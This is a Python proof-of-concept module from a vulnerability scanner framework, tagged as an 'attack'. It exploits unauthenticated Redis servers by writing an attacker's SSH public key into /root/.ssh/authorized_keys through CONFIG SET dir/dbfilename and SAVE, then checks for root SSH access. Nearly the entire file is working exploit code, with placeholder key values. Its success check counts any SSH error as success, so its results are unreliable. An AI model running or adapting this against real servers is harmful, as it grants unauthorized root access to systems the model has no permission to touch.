# -*- coding: utf-8 -*-
# @Time   : 2018/4/26 下午10:06
# @author : Xmchx
# @File   : redis_sshkey_getshell.py


import redis
import paramiko
import time
from collections import OrderedDict
from kunscanner.lib.utils.utils import RandomString,DomainToIP,CheckPort,GetNetloc
from paramiko.ssh_exception import SSHException
from kunscanner.lib.core.exception import PocWarningException,PocErrorException
from kunscanner.lib.core.enums import SCRIPT_LEVEL

def Info():
    poc_info = OrderedDict()
    poc_info['name'] = "redis_sshkey_getshell"
    poc_info['info'] = "redis unauthorized and set sshkey getshell"
    poc_info['title'] = u'Redis写入SSH key'
    poc_info['author'] = "i@cdxy.me"
    poc_info['time'] = "2018.04.27"
    poc_info['type'] = 'attack'
    poc_info['level'] = SCRIPT_LEVEL.HIGH
    return poc_info


def Poc(url):
    init_url = url
    public_key = '1'

    if public_key == '':
        raise PocErrorException('Poc:redis_sshkey_getshell Public_key is none! please input public_key.')
    result = {}
    result['success'] = False
    result['message'] = ''
    try:
        url = GetNetloc(url)
        url = DomainToIP(url)
        ip = url.split(':')[0]
        port = int(url.split(':')[-1]) if ':' in url else 6379
        if not CheckPort(ip, 22):
            return result
        r = redis.Redis(host=ip, port=port, db=0, socket_timeout=2, socket_connect_timeout=2)
        if 'redis_version' in r.info():
            key = RandomString(10)
            r.set(key, '\n\n' + public_key + '\n\n')
            r.config_set('dir', '/root/.ssh')
            r.config_set('dbfilename', 'authorized_keys')
            r.save()
            r.delete(key)
            r.config_set('dir', '/tmp')
            time.sleep(5)
            if testConnect(ip, 22):
                result['success'] = True
                return result
        return result
    except Exception,e:
        raise PocWarningException(init_url, Info()['name'], repr(e))


def testConnect(ip, port=22):
    private_key = '1'
    if private_key == '':
        raise PocErrorException('Poc:redis_sshkey_getshell Private_key is none! please input private_key.')
    try:
        s = paramiko.SSHClient()
        s.load_system_host_keys()
        s.connect(ip, port, username='root', pkey=private_key, timeout=2)
        s.close()
        return True
    except Exception, e:
        if type(e) == SSHException:
            return True
        return False